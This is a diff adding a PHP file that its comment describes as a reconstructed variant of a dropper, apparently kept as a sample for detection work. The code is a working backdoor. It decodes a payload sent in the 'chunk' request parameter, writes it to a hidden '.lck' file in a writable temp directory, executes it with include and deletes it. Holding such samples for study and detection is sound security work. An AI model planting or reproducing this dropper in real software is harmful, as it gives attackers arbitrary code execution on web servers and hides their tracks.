@@ -1,0 +1,25 @@
+<?php
+/* Reconstruction of a 2026-09 dropper build with the two
+   details a new build could change: the decoder alphabet reordered and the
+   <!--tag--> prelude dropped. Reads its one key through a variable, from
+   $_REQUEST. Stored as .txt; never executed. */
+$value = "chunk";
+if (@$_REQUEST[$value] !== null) {
+    $data = array_filter([session_save_path(), "/var/tmp", getenv("TMP"), ini_get("upload_tmp_dir"), "/dev/shm", sys_get_temp_dir()]);
+    $parts = explode('.', $_REQUEST[$value]);
+    $out = '';
+    $s = '0123456789abcdefghijklmnopqrstuvwxyz';
+    foreach ($parts as $i => $v) {
+        $out .= chr(((int) $v - ord($s[$i % 36]) - ($i % 10)) ^ 41);
+    }
+    foreach ($data as $dir) {
+        if (is_dir($dir) && is_writable($dir)) {
+            $rec = sprintf("%s/.lck", $dir);
+            if (file_put_contents($rec, $out)) {
+                include $rec;
+                @unlink($rec);
+                exit;
+            }
+        }
+    }
+}
